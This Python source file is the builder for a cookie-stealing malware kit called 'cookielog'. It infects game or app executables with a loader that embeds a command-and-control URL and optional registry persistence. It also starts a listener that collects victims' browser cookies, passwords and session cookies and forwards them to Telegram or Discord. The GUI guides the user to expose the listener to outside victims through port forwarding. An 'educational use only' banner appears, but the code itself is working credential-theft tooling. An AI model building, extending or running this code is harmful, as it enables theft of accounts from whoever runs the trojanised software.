#!/usr/bin/env python3
"""auto.py — one-click payload setup. Builds, starts listener, infects .exe.

  EDUCATIONAL USE ONLY — FOR SECURITY RESEARCH AND TRAINING

  This is offensive security tooling for penetration testing, red-team
  exercises, and security education. It builds an infected executable that
  extracts browser cookies from a target machine and exfiltrates them to a
  remote C2 server.

  ONLY use this on systems you own or are explicitly authorized to test.
  Unauthorized use against third-party systems, networks, or individuals is
  illegal in most jurisdictions. The authors are not responsible for misuse.

Usage:
    python auto.py                      # GUI mode (file/folder picker)
    python auto.py game.exe             # CLI: infect standalone .exe
    python auto.py "C:\\path\\game folder"  # CLI: infect folder (game/app)
    python auto.py game.exe --run       # CLI + run infected locally (test)
    python auto.py --port 9400          # custom C2 port (default: 9090)
    python auto.py game.exe --persist   # install registry Run key on victim
    python auto.py game.exe --telegram bot_token:chat_id   # relay via Telegram
    python auto.py game.exe --discord https://discord.com/api/webhooks/...  # relay via Discord
    python auto.py game.exe --c2 http://1.2.3.4:9400/      # manual C2 URL (for NAT/external)
    python auto.py game.exe --no-anti-vm                    # disable VM detection (for testing in VMs)
    python auto.py game.exe --find-port                     # auto-scan for a free port (9400-9500)

    python auto.py --config             # show saved settings (config.json)
    python auto.py --clear-telegram     # remove saved Telegram token
    python auto.py --clear-discord      # remove saved Discord webhook

    Telegram/Discord keys are saved to config.json automatically on first use.
    After that, just run:  python auto.py game.exe   (keys are loaded from config)

Output structure:
    ifec/
      folds/   <- infected exes that need their folder (games, apps with DLLs/data)
      apps/    <- standalone infected exes (no folder dependencies)

What it does:
    1. Checks if loader.exe + ckdll.dll exist; if not, runs build.bat
    2. Detects attacker's local IP for C2 URL
    3. Starts listen.py in background (HTTP listener)
    4. Infects the .exe with the embedded C2 URL
       - Folder mode: copies entire folder to ifec/folds/, infects the main .exe in place
       - Standalone mode: infects to ifec/apps/<name>.exe
    5. Without --run: prints instructions (send ifec/ to victim)
       With --run: runs the infected exe locally for testing

Press Ctrl+C to stop early.
"""
import json, os, shutil, socket, subprocess, sys, time, struct, urllib.request, urllib.parse

HERE   = os.path.dirname(os.path.abspath(__file__))
BIN    = os.path.join(HERE, "bin")
LOADER = os.path.join(BIN, "loader.exe")
DLL    = os.path.join(BIN, "ckdll.dll")
LOOT   = os.path.join(HERE, "loot")
IFEC   = os.path.join(HERE, "ifec")
IFEC_FOLDS = os.path.join(IFEC, "folds")
IFEC_APPS  = os.path.join(IFEC, "apps")
LISTEN = os.path.join(HERE, "listen.py")
BUILD  = os.path.join(HERE, "build.bat")
CONFIG = os.path.join(HERE, "config.json")
MAGIC  = b"CKLG"
C2_SENTINEL = b"CKC2_DEADBEEF_"
PERSIST_SENTINEL = b"CKPR____"
PERSIST_ENABLE = b"CKPR0001"
AV_SENTINEL = b"CKAV0000"
AV_DISABLE  = b"CKAV0001"

def log(msg):
    print(msg, flush=True)

# ------------------------------------------------------------------ config persistence
# config.json stores telegram token, discord webhook, default port, and persist flag.
# When --telegram / --discord is passed via CLI, it's saved automatically.
# When no flag is passed, saved values are loaded from config.json.

def load_config():
    """Load config.json. Returns dict with telegram, discord, port, persist."""
    if os.path.exists(CONFIG):
        try:
            with open(CONFIG, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def save_config(cfg):
    """Save config dict to config.json."""
    try:
        with open(CONFIG, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2, ensure_ascii=False)
    except Exception as ex:
        log("[-] failed to save config: %s" % ex)

def show_config():
    """Print current saved config."""
    cfg = load_config()
    log("=" * 50)
    log("  Saved configuration (config.json)")
    log("=" * 50)
    if not cfg:
        log("  (empty -- no saved settings)")
    else:
        tg = cfg.get("telegram", "")
        if tg:
            # Show bot token partially masked + chat ID
            parts = tg.rsplit(":", 1)
            if len(parts) == 2:
                bot, chat = parts
                masked = bot[:8] + "..." + bot[-4:] if len(bot) > 12 else bot
                log("  Telegram:  %s : %s" % (masked, chat))
            else:
                log("  Telegram:  %s" % tg)
        else:
            log("  Telegram:  (not set)")
        dc = cfg.get("discord", "")
        if dc:
            # Mask the webhook token part
            masked = dc[:50] + "..." if len(dc) > 50 else dc
            log("  Discord:   %s" % masked)
        else:
            log("  Discord:   (not set)")
        log("  Port:      %s" % cfg.get("port", 9090))
        log("  Persist:   %s" % ("enabled" if cfg.get("persist") else "disabled"))
    log("=" * 50)

def tg_lookup_chatid(bot_token):
    """Query Telegram getUpdates API to find the chat_id of the latest message sender.
    Returns (chat_id string, or None). The user must have sent a message to the bot first."""
    try:
        url = "https://api.telegram.org/bot%s/getUpdates" % bot_token
        req = urllib.request.Request(url)
        resp = urllib.request.urlopen(req, timeout=10)
        data = json.loads(resp.read().decode("utf-8"))
        if data.get("ok") and data.get("result"):
            # Get the last message's chat ID
            last = data["result"][-1]
            chat_id = last["message"]["chat"]["id"]
            return str(chat_id)
        return None
    except Exception:
        return None

def detect_ip():
    """Detect attacker's local IP (not 127.0.0.1)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        if ip.startswith("0.") or ip.startswith("169.254."):
            return "127.0.0.1"
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "127.0.0.1"

def _is_private_ip(ip):
    """Check if IP is a private/LAN address (RFC 1918). Returns True for 10.x, 172.16-31.x, 192.168.x."""
    try:
        parts = [int(x) for x in ip.split(".")]
        if len(parts) != 4:
            return False
        a, b = parts[0], parts[1]
        if a == 10:
            return True
        if a == 172 and 16 <= b <= 31:
            return True
        if a == 192 and b == 168:
            return True
        return False
    except Exception:
        return False

def detect_public_ip(timeout=5):
    """Fetch the attacker's public IP via api.ipify.org. Returns string or None."""
    try:
        req = urllib.request.Request("https://api.ipify.org")
        resp = urllib.request.urlopen(req, timeout=timeout)
        ip = resp.read().decode("utf-8", "replace").strip()
        # Basic validation: must look like an IP
        parts = ip.split(".")
        if len(parts) == 4 and all(p.isdigit() for p in parts):
            return ip
        return None
    except Exception:
        return None

def find_best_port(start=9400, end=9500, preferred=None):
    """Scan a range of ports and return the first one that is free (not in use).

    Tries 'preferred' first (if given), then scans start..end. Returns the port
    number as int, or None if every port in the range is occupied.

    A port is considered free if we can bind a TCP socket to it on 0.0.0.0
    without SO_REUSEADDR (so ports already in LISTEN state are correctly
    detected as occupied on Windows).
    """
    # Try preferred port first (e.g. the saved config port)
    if preferred:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(("0.0.0.0", preferred))
            s.close()
            return preferred
        except (OSError, socket.error):
            pass  # preferred is taken, scan the range

    for p in range(start, end + 1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(("0.0.0.0", p))
            s.close()
            return p
        except (OSError, socket.error):
            continue
    return None

def ensure_build():
    """Build loader.exe + ckdll.dll if they don't exist."""
    if os.path.isfile(LOADER) and os.path.isfile(DLL):
        log("[+] binaries already compiled")
        return True
    if not os.path.isfile(BUILD):
        log("[-] build.bat not found")
        return False
    log("[*] building binaries (needs MSVC)...")
    r = subprocess.run(["cmd", "/c", BUILD], cwd=HERE,
                       capture_output=True, text=True, timeout=60)
    if r.stdout:
        for line in r.stdout.strip().splitlines():
            log("    " + line)
    if r.stderr:
        for line in r.stderr.strip().splitlines():
            log("    [!] " + line)
    if r.returncode != 0:
        log("[-] build failed (exit %d)" % r.returncode)
        return False
    if os.path.isfile(LOADER) and os.path.isfile(DLL):
        log("[+] build OK")
        return True
    log("[-] build succeeded but binaries not found")
    return False

# ------------------------------------------------------------------ exe finding

def find_main_exe(folder):
    """Find the main .exe in a folder.
    Heuristic: prefer exe whose name matches a <name>_Data/ subfolder (Unity),
    then the largest .exe, then the only .exe.
    Returns (exe_path, exe_name) or (None, None).
    """
    exes = []
    for root, dirs, files in os.walk(folder):
        # skip subfolders that are clearly not the main exe location
        for f in files:
            if f.lower().endswith(".exe"):
                exes.append(os.path.join(root, f))
    if not exes:
        return None, None
    if len(exes) == 1:
        return exes[0], os.path.basename(exes[0])

    # Try to match <name>_Data/ pattern (Unity games)
    for exe_path in exes:
        exe_name = os.path.basename(exe_path)
        stem = os.path.splitext(exe_name)[0]
        data_dir = os.path.join(folder, stem + "_Data")
        if os.path.isdir(data_dir):
            return exe_path, exe_name

    # Fallback: largest .exe (skip known helper exes)
    skip = ("unitycrashhandler", "crashpad_handler", "setup", "uninstall",
            "updater", "helper", "crashpad")
    candidates = [e for e in exes
                  if os.path.basename(e).lower().split(".")[0] not in skip
                  and not any(s in os.path.basename(e).lower() for s in skip)]
    if not candidates:
        candidates = exes
    candidates.sort(key=lambda p: os.path.getsize(p), reverse=True)
    return candidates[0], os.path.basename(candidates[0])

# ------------------------------------------------------------------ infection

def _patch_loader(loader_bytes, c2_url, persist=False, no_anti_vm=False):
    """Strip old appended data from loader, patch C2 + persistence + anti-VM sentinels.
    Returns patched bytes.
    The sentinels are in the LOADER's .data section (plaintext), not in the
    encrypted payload — the loader patches the decrypted payload at runtime."""
    idx = loader_bytes.rfind(MAGIC)
    if idx != -1 and idx > len(loader_bytes) - 12:
        old_len = struct.unpack_from("<I", loader_bytes, idx - 4)[0]
        loader_bytes = loader_bytes[:idx - 4 - old_len]
    if c2_url:
        sidx = loader_bytes.find(C2_SENTINEL)
        if sidx != -1:
            url_bytes = c2_url.encode("utf-8")[:255]
            url_padded = url_bytes + b"\0" * (256 - len(url_bytes))
            loader_bytes = loader_bytes[:sidx] + url_padded + loader_bytes[sidx+256:]
    if persist:
        pidx = loader_bytes.find(PERSIST_SENTINEL)
        if pidx != -1:
            loader_bytes = loader_bytes[:pidx] + PERSIST_ENABLE + loader_bytes[pidx+8:]
    if no_anti_vm:
        aidx = loader_bytes.find(AV_SENTINEL)
        if aidx != -1:
            loader_bytes = loader_bytes[:aidx] + AV_DISABLE + loader_bytes[aidx+8:]
    return loader_bytes

def _extract_original_host(host_bytes):
    """If host was already infected, extract the original bytes."""
    hidx = host_bytes.rfind(MAGIC)
    if hidx != -1 and hidx > len(host_bytes) - 12:
        old_hlen = struct.unpack_from("<I", host_bytes, hidx - 4)[0]
        if old_hlen > 0 and hidx - 4 - old_hlen > 0:
            log("[*] host was already infected -- extracting original")
            return host_bytes[hidx - 4 - old_hlen : hidx - 4]
    return host_bytes

def build_infected_bytes(host_path, c2_url, persist=False, no_anti_vm=False):
    """Read host, patch loader, return infected bytes [loader][host][len][CKLG]."""
    with open(LOADER, "rb") as f:
        loader_bytes = f.read()
    with open(host_path, "rb") as f:
        host_bytes = f.read()
    loader_bytes = _patch_loader(loader_bytes, c2_url, persist, no_anti_vm)
    host_bytes = _extract_original_host(host_bytes)
    return loader_bytes + host_bytes + struct.pack("<I", len(host_bytes)) + MAGIC

def build_infected_standalone(host_path, c2_url, persist=False, no_anti_vm=False):
    """Infect a standalone .exe -> ifec/apps/<name>.exe"""
    os.makedirs(IFEC_APPS, exist_ok=True)
    bname = os.path.basename(host_path)
    out_path = os.path.join(IFEC_APPS, bname)
    infected = build_infected_bytes(host_path, c2_url, persist, no_anti_vm)
    with open(out_path, "wb") as f:
        f.write(infected)
    return out_path

def build_infected_folder(host_dir, c2_url, persist=False, no_anti_vm=False):
    """Copy folder to ifec/folds/<folder_name>/, infect the main .exe in place.

    Returns (out_exe_path, original_exe_path) or (None, None) if no .exe found.
    """
    exe_path, exe_name = find_main_exe(host_dir)
    if not exe_path:
        log("[-] no .exe found in folder: %s" % host_dir)
        return None, None

    log("[+] main exe: %s (%d KB)" % (exe_name, os.path.getsize(exe_path) // 1024))

    folder_name = os.path.basename(os.path.abspath(host_dir))
    dest_folder = os.path.join(IFEC_FOLDS, folder_name)

    # if destination already exists, remove it (fresh copy)
    if os.path.exists(dest_folder):
        log("[*] removing old copy: ifec/folds/%s/" % folder_name)
        shutil.rmtree(dest_folder, ignore_errors=True)

    log("[*] copying folder to ifec/folds/%s/ ..." % folder_name)
    shutil.copytree(host_dir, dest_folder)
    log("[+] folder copied (%.1f MB)" % (
        sum(os.path.getsize(os.path.join(r,f))
            for r,_,fs in os.walk(dest_folder) for f in fs) / 1048576))

    # infect the exe in place: overwrite the copy with the infected version
    dest_exe = os.path.join(dest_folder, os.path.relpath(exe_path, host_dir))
    infected = build_infected_bytes(exe_path, c2_url, persist, no_anti_vm)
    with open(dest_exe, "wb") as f:
        f.write(infected)

    log("[+] infected in place: ifec/folds/%s/%s" % (folder_name,
        os.path.relpath(exe_path, host_dir)))
    log("    original: %d KB -> infected: %d KB" % (
        os.path.getsize(exe_path) // 1024, len(infected) // 1024))

    return dest_exe, exe_path

# ------------------------------------------------------------------ listener

def start_listener(port, telegram=None, discord=None):
    """Start listen.py in background. Returns the process handle.
    If telegram or discord are provided, listen.py relays received cookies to them.
    Uses CREATE_NEW_CONSOLE so the listener has its own window (can't be killed by
    closing the main terminal). Output is also written to loot/listener.log."""
    os.makedirs(LOOT, exist_ok=True)
    # refuse to start twice: a zombie listener from a previous run kept the port,
    # the new listener died with EADDRINUSE and every victim POST was lost
    try:
        probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        probe.bind(("0.0.0.0", port))
        probe.close()
    except OSError:
        log("[!] port %d already in use -- kill the old listener or pass --port / --find-port" % port)
        return None
    # clean old loot (both old and new filenames)
    for f in ["all_cookies.json", "all_cookies.txt",
              "passwords.json", "passwords.txt",
              "session_cookies.json", "session_cookies.txt",
              "cookies.json", "cookies.txt",  # legacy names
              "listener.log"]:
        p = os.path.join(LOOT, f)
        if os.path.exists(p):
            os.remove(p)
    cmd = [sys.executable, "-u", LISTEN, str(port)]
    if telegram:
        cmd += ["--telegram", telegram]
    if discord:
        cmd += ["--discord", discord]
    proc = subprocess.Popen(
        cmd,
        cwd=HERE,
        creationflags=0x00000010  # CREATE_NEW_CONSOLE — listener gets its own window
    )
    time.sleep(2)
    if proc.poll() is not None:
        log("[-] listener failed to start")
        return None
    log("[+] listener on port %d (PID=%d)" % (port, proc.pid))
    return proc

def wait_for_cookies(timeout=300):
    """Wait for loot/all_cookies.json to appear in loot/. Print summary when done."""
    json_path = os.path.join(LOOT, "all_cookies.json")
    pwd_path = os.path.join(LOOT, "passwords.json")
    sess_path = os.path.join(LOOT, "session_cookies.json")
    log("[*] waiting for cookies (timeout=%ds, Ctrl+C to stop)..." % timeout)
    start = time.time()
    while time.time() - start < timeout:
        if os.path.isfile(json_path) and os.path.getsize(json_path) > 10:
            try:
                with open(json_path, encoding="utf-8") as f:
                    data = json.load(f)
                if data:
                    log("\n[+] %d cookies received!" % len(data))
                    log("    -> %s (%d bytes)" % (json_path, os.path.getsize(json_path)))
                    # passwords
                    pwd_count = 0
                    if os.path.isfile(pwd_path):
                        try:
                            with open(pwd_path, encoding="utf-8") as f:
                                pwd_count = len(json.load(f))
                        except Exception:
                            pass
                        log("    -> %s (%d passwords)" % (pwd_path, pwd_count))
                    # session
                    sess_count = 0
                    if os.path.isfile(sess_path):
                        try:
                            with open(sess_path, encoding="utf-8") as f:
                                sess_count = len(json.load(f))
                        except Exception:
                            pass
                        log("    -> %s (%d session cookies)" % (sess_path, sess_count))
                    # top domains
                    top = {}
                    for c in data:
                        d = c.get("domain", "?")
                        top[d] = top.get(d, 0) + 1
                    log("\n    top domains:")
                    for d, n in sorted(top.items(), key=lambda kv: -kv[1])[:15]:
                        log("      %5d  %s" % (n, d))
                    log("\n[*] import in browser: Cookie-Editor extension -> Import -> paste loot/all_cookies.json")
                    return True
            except (json.JSONDecodeError, IOError):
                pass
        time.sleep(1)
    log("[-] timeout -- no cookies received in %ds" % timeout)
    log("    check: is the listener running? is the C2 URL correct?")
    log("    fallback on the target: C:\\ProgramData\\MediaCache\\cache.json")
    return False

# ------------------------------------------------------------------ local test run

def run_infected_locally(host_path, infected_path, is_folder=False):
    """Run the infected exe locally for testing.

    For standalone exe: copy infected over original, run, wait, restore.
    For folder exe: just run from ifec/folds/ (the folder copy is self-contained).
    """
    if is_folder:
        # Folder mode: the infected exe is already in ifec/folds/<name>/
        # with all its dependencies. Just run it directly.
        log("[*] launching infected exe from ifec/folds/ ...")
        wdir = os.path.dirname(infected_path)
        proc = subprocess.Popen([infected_path], cwd=wdir)
        log("[+] process started (PID=%d)" % proc.pid)
        _wait_and_cleanup(proc, infected_path, os.path.basename(infected_path))
        return

    # Standalone mode: backup original, copy infected over, run, restore
    backup = host_path + ".orig"
    shutil.copy2(host_path, backup)
    log("[+] backed up original: %s" % backup)

    shutil.copy2(infected_path, host_path)
    log("[+] copied infected exe to: %s" % host_path)

    log("[*] launching infected exe...")
    proc = subprocess.Popen([host_path])
    log("[+] loader started (PID=%d)" % proc.pid)

    _wait_and_cleanup(proc, host_path, os.path.basename(host_path), backup)

def _wait_and_cleanup(proc, host_path, exe_name, backup=None):
    """Wait for game to open, kill loader, wait for payload, kill game, restore."""
    loader_pid = proc.pid

    # wait for the game/app to open, then kill the loader
    log("[*] waiting 10s for game to open + payload to start...")
    time.sleep(10)
    try:
        proc.terminate()
        log("[*] loader terminated (PID=%d)" % loader_pid)
    except Exception:
        log("[!] could not terminate loader")

    # wait for payload to finish (extraction + HTTP exfiltration)
    log("[*] waiting 25s for payload extraction + HTTP exfil...")
    time.sleep(25)

    # kill the game process — it holds the file lock on host_path
    log("[*] killing game process (%s)..." % exe_name)
    try:
        subprocess.run('taskkill /F /IM "%s" >nul 2>&1' % exe_name,
                       shell=True, timeout=5)
    except Exception:
        pass

    # kill orphaned child processes of the dead loader (hollowed cmd.exe)
    try:
        ps_cmd = (
            'Get-CimInstance Win32_Process | '
            'Where-Object { $_.ParentProcessId -eq %d } | '
            'ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }'
        ) % loader_pid
        subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd],
                       capture_output=True, timeout=10)
    except Exception:
        pass

    time.sleep(2)

    # restore original (standalone mode only)
    if backup:
        for attempt in range(5):
            try:
                shutil.copy2(backup, host_path)
                os.remove(backup)
                log("[+] original .exe restored")
                break
            except Exception:
                if attempt < 4:
                    log("[!] file locked, retrying in 3s... (%d/5)" % (attempt + 1))
                    try:
                        subprocess.run('taskkill /F /IM "%s" >nul 2>&1' % exe_name,
                                       shell=True, timeout=3)
                    except Exception:
                        pass
                    time.sleep(3)
                else:
                    log("[!] could not restore original after 5 attempts")
                    log("    backup at: %s" % backup)
                    log("    restore manually: copy /b \"%s\" \"%s\"" % (backup, host_path))

    # clean up temp file from rename-restore
    wdir = os.path.dirname(host_path)
    bak_tmp = os.path.join(wdir, "~ck_bak.bin")
    if os.path.exists(bak_tmp):
        try: os.remove(bak_tmp)
        except Exception: pass

# ------------------------------------------------------------------ GUI

def pick_gui():
    """Open a GUI dialog. Returns (path, mode, run, telegram, discord, persist).
    mode is 'file' or 'folder'. telegram/discord are strings or None. persist is bool.

    Relay design:
    - Telegram/Discord keys are always stored in the Entry fields and saved to config.json.
    - A checkbox per relay controls whether it's USED for this run (enabled/disabled).
    - Toggling the checkbox does NOT clear the key -- it just sets enabled/disabled.
    - SAVE button writes the current field values to config.json immediately.
    - When infecting, a relay is only passed to the listener if: checkbox is ON AND field is non-empty.
    """
    try:
        import tkinter as tk
        from tkinter import filedialog, ttk
        import urllib.request as _ureq
        import socket as _sock
        root = tk.Tk()
        root.title("cookielog -- auto infector")
        root.geometry("620x760")
        root.configure(bg="#1a1a1a")
        root.resizable(False, False)
        style = ttk.Style()
        style.theme_use("clam")
        style.configure(".", background="#1a1a1a", foreground="#d4d4d4",
                        font=("Segoe UI", 10))
        style.configure("TLabel", background="#1a1a1a", foreground="#d4d4d4")
        style.configure("TButton", background="#2d2d2d", foreground="#d4d4d4",
                        font=("Segoe UI", 10, "bold"), padding=(12, 8))
        style.configure("Act.TButton", background="#1a6b1a", foreground="#ffffff",
                        font=("Segoe UI", 10, "bold"), padding=(12, 8))
        style.configure("Warn.TButton", background="#6b3a1a", foreground="#ffffff",
                        font=("Segoe UI", 10, "bold"), padding=(12, 8))
        style.configure("TEntry", fieldbackground="#2d2d2d", foreground="#d4d4d4",
                        insertcolor="#d4d4d4")
        style.configure("TCheckbutton", background="#1a1a1a", foreground="#d4d4d4")
        result = {"path": None, "mode": None, "run": False,
                  "telegram": None, "discord": None, "persist": False,
                  "c2_url": None, "no_anti_vm": False}

        # Load saved config to pre-fill fields
        cfg = load_config()

        # Educational use notice
        ttk.Label(root, text="EDUCATIONAL USE ONLY -- security research / training tool",
                  font=("Segoe UI", 8, "bold"),
                  foreground="#cc6600").pack(pady=(8, 2))

        ttk.Label(root, text="cookielog -- auto infector",
                  font=("Segoe UI", 14, "bold"),
                  foreground="#4a9eff").pack(pady=(8, 2))
        ttk.Label(root, text="select a folder (game/app) or a standalone .exe",
                  font=("Segoe UI", 9)).pack(pady=(0, 10))

        # --- C2 URL section ---
        ttk.Label(root, text="C2 settings (where the victim sends cookies)",
                  font=("Segoe UI", 10, "bold"),
                  foreground="#4a9eff").pack(anchor="w", padx=50, pady=(0, 4))

        # C2 URL field
        c2_frame = tk.Frame(root, bg="#1a1a1a")
        c2_frame.pack(fill="x", padx=50, pady=(0, 2))
        ttk.Label(c2_frame, text="C2 URL:", width=8,
                  font=("Segoe UI", 9)).pack(side="left")
        saved_port = cfg.get("port", 9090)
        _lan_ip = detect_ip()
        _default_c2 = "http://%s:%d/" % (_lan_ip, saved_port)
        c2_var = tk.StringVar(value=_default_c2)
        ttk.Entry(c2_frame, textvariable=c2_var).pack(fill="x", side="left",
                                                       expand=True, padx=(4, 0))

        # IP detect buttons + status
        ip_frame = tk.Frame(root, bg="#1a1a1a")
        ip_frame.pack(fill="x", padx=50, pady=(2, 0))
        ttk.Button(ip_frame, text="DETECT LAN IP",
                   command=lambda: _detect_lan()).pack(side="left", padx=(0, 4))
        ttk.Button(ip_frame, text="DETECT PUBLIC IP",
                   command=lambda: _detect_public()).pack(side="left", padx=(0, 4))
        ip_status = tk.Label(ip_frame, text="", bg="#1a1a1a",
                             font=("Segoe UI", 8, "bold"))
        ip_status.pack(side="left", padx=(8, 0))

        # NAT warning label (hidden by default)
        nat_warn = tk.Label(root, text="", bg="#1a1a1a", fg="#cc6600",
                            font=("Segoe UI", 8), justify="left", wraplength=520)
        nat_warn.pack(anchor="w", padx=50, pady=(2, 0))

        # Port field
        port_frame = tk.Frame(root, bg="#1a1a1a")
        port_frame.pack(fill="x", padx=50, pady=(4, 0))
        ttk.Label(port_frame, text="Port:", width=8,
                  font=("Segoe UI", 9)).pack(side="left")
        port_var = tk.IntVar(value=saved_port)
        ttk.Entry(port_frame, textvariable=port_var, width=8).pack(side="left", padx=(4, 0))
        ttk.Button(port_frame, text="FIND BEST PORT",
                   command=lambda: _find_best_port()).pack(side="left", padx=(8, 0))
        port_status = tk.Label(port_frame, text="", bg="#1a1a1a",
                               font=("Segoe UI", 8, "bold"))
        port_status.pack(side="left", padx=(8, 0))

        # TEST C2 button
        test_frame = tk.Frame(root, bg="#1a1a1a")
        test_frame.pack(fill="x", padx=50, pady=(4, 0))
        ttk.Button(test_frame, text="TEST C2 (check if listener is reachable)",
                   command=lambda: _test_c2()).pack(side="left")
        test_status = tk.Label(test_frame, text="", bg="#1a1a1a",
                               font=("Segoe UI", 8, "bold"))
        test_status.pack(side="left", padx=(8, 0))

        # Anti-VM checkbox
        avm_row = tk.Frame(root, bg="#1a1a1a")
        avm_row.pack(fill="x", padx=50, pady=(4, 0))
        avm_var = tk.BooleanVar(value=False)
        tk.Checkbutton(avm_row, text="Disable anti-VM (use if victim is a VM)",
                       variable=avm_var,
                       bg="#1a1a1a", fg="#d4d4d4", selectcolor="#2d2d2d",
                       activebackground="#1a1a1a", activeforeground="#d4d4d4",
                       bd=0, highlightthickness=0,
                       font=("Segoe UI", 9)).pack(side="left")

        # --- IP detection functions ---
        def _find_best_port():
            """Scan ports 9400-9500 (plus the current port) and pick the first free one."""
            port_status.config(text="scanning 9400-9500...", fg="#888888")
            root.update()
            cur = port_var.get()
            best = find_best_port(start=9400, end=9500, preferred=cur)
            if best is not None:
                port_var.set(best)
                port_status.config(text="port %d is free" % best, fg="#5cb85c")
                # Update C2 URL with the new port
                c2_url_cur = c2_var.get().strip()
                if c2_url_cur:
                    # Replace the :PORT/ part
                    import re as _re
                    new_c2 = _re.sub(r":\d+/", ":%d/" % best, c2_url_cur)
                    c2_var.set(new_c2)
            else:
                port_status.config(text="no free port in 9400-9500!", fg="#cc6600")

        def _detect_lan():
            ip = detect_ip()
            port = port_var.get()
            c2_var.set("http://%s:%d/" % (ip, port))
            if _is_private_ip(ip):
                ip_status.config(text="LAN: %s (private)" % ip, fg="#cc6600")
                nat_warn.config(text=(
                    "WARNING: %s is a LAN IP. External machines CANNOT reach it.\n"
                    "Click DETECT PUBLIC IP, then port-forward port %d on your router." % (ip, port)))
            else:
                ip_status.config(text="IP: %s" % ip, fg="#5cb85c")
                nat_warn.config(text="")

        def _detect_public():
            ip_status.config(text="fetching public IP...", fg="#888888")
            root.update()
            pub = detect_public_ip()
            if pub:
                port = port_var.get()
                c2_var.set("http://%s:%d/" % (pub, port))
                ip_status.config(text="PUBLIC: %s" % pub, fg="#5cb85c")
                nat_warn.config(text=(
                    "Public IP set. Make sure port %d is forwarded on your router\n"
                    "to this machine, and the listener is running before sending the exe." % port))
            else:
                ip_status.config(text="failed to get public IP", fg="#cc6600")
                nat_warn.config(text="Could not reach api.ipify.org. Check your internet connection.")

        def _test_c2():
            url = c2_var.get().strip()
            if not url:
                test_status.config(text="no C2 URL set", fg="#cc6600")
                return
            test_status.config(text="testing...", fg="#888888")
            root.update()
            try:
                # Try a quick TCP connect to the host:port
                # Parse URL
                p = url.replace("http://", "").replace("https://", "")
                host_part = p.split("/")[0]
                if ":" in host_part:
                    host, port_str = host_part.rsplit(":", 1)
                    test_port = int(port_str)
                else:
                    host = host_part
                    test_port = 80
                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, test_port))
                s.close()
                test_status.config(text="REACHABLE", fg="#5cb85c")
            except Exception as ex:
                test_status.config(text="UNREACHABLE: %s" % str(ex)[:40], fg="#cc6600")

        # Initialize IP status
        _detect_lan()

        def do_folder():
            d = filedialog.askdirectory(title="Select game/app folder (contains the .exe)")
            if d:
                result["path"] = d
                result["mode"] = "folder"
                _save_and_close()

        def do_folder_run():
            d = filedialog.askdirectory(title="Select folder to infect AND run locally")
            if d:
                result["path"] = d
                result["mode"] = "folder"
                result["run"] = True
                _save_and_close()

        def do_file():
            f = filedialog.askopenfilename(
                title="Select standalone .exe to infect",
                filetypes=[("executables", "*.exe"), ("all files", "*.*")])
            if f:
                result["path"] = f
                result["mode"] = "file"
                _save_and_close()

        def do_file_run():
            f = filedialog.askopenfilename(
                title="Select .exe to infect AND run locally",
                filetypes=[("executables", "*.exe"), ("all files", "*.*")])
            if f:
                result["path"] = f
                result["mode"] = "file"
                result["run"] = True
                _save_and_close()

        def _collect_relay_values():
            """Read the current field values from the GUI.
            Returns (telegram, discord, persist) where telegram/discord are
            strings (or None if disabled or empty)."""
            tg_key = tg_var.get().strip()
            dc_key = dc_var.get().strip()
            tg = tg_key if (tg_enable.get() and tg_key) else None
            dc = dc_key if (dc_enable.get() and dc_key) else None
            ps = bool(persist_var.get())
            return tg, dc, ps

        def _save_to_config():
            """Write current field values to config.json.
            Keys are always saved (even if relay is disabled) so toggling
            back on restores them. The enabled state is NOT persisted to
            config -- the key existing in config means 'enabled'."""
            tg_key = tg_var.get().strip()
            dc_key = dc_var.get().strip()
            cfg_new = load_config()
            # Always save keys if the field is non-empty (even if checkbox is off)
            if tg_key:
                cfg_new["telegram"] = tg_key
            # Don't delete the key if checkbox is off -- keep it in config
            # so the user can re-enable without re-typing
            if dc_key:
                cfg_new["discord"] = dc_key
            cfg_new["persist"] = bool(persist_var.get())
            cfg_new["port"] = cfg.get("port", 9090)
            save_config(cfg_new)
            return cfg_new

        def _save_and_close():
            # Save to config first
            _save_to_config()
            # Collect relay values for this run
            tg, dc, ps = _collect_relay_values()
            if tg:
                result["telegram"] = tg
            if dc:
                result["discord"] = dc
            result["persist"] = ps
            # Collect C2 URL and anti-VM from GUI
            c2 = c2_var.get().strip()
            if c2:
                result["c2_url"] = c2
            result["no_anti_vm"] = bool(avm_var.get())
            # Save port to config
            cfg2 = load_config()
            cfg2["port"] = port_var.get()
            save_config(cfg2)
            root.destroy()

        # Folder buttons (green = recommended for games)
        ttk.Button(root, text="SELECT FOLDER (game/app with files)",
                   style="Act.TButton", command=do_folder).pack(pady=3, fill="x", padx=50)
        ttk.Button(root, text="SELECT FOLDER + RUN LOCALLY (test)",
                   style="Warn.TButton", command=do_folder_run).pack(pady=3, fill="x", padx=50)

        ttk.Separator(root).pack(fill="x", padx=50, pady=8)

        # Standalone exe buttons
        ttk.Button(root, text="SELECT .EXE (standalone, no folder)",
                   command=do_file).pack(pady=3, fill="x", padx=50)
        ttk.Button(root, text="SELECT .EXE + RUN LOCALLY (test)",
                   command=do_file_run).pack(pady=3, fill="x", padx=50)

        # --- Relay config section ---
        ttk.Separator(root).pack(fill="x", padx=50, pady=(12, 5))
        ttk.Label(root, text="Relay settings",
                  font=("Segoe UI", 10, "bold"),
                  foreground="#4a9eff").pack(anchor="w", padx=50, pady=(0, 4))

        # Variables
        tg_var = tk.StringVar(value=cfg.get("telegram", "") or "")
        dc_var = tk.StringVar(value=cfg.get("discord", "") or "")
        tg_enable = tk.BooleanVar(value=bool(cfg.get("telegram", "")))
        dc_enable = tk.BooleanVar(value=bool(cfg.get("discord", "")))
        persist_var = tk.BooleanVar(value=bool(cfg.get("persist", False)))

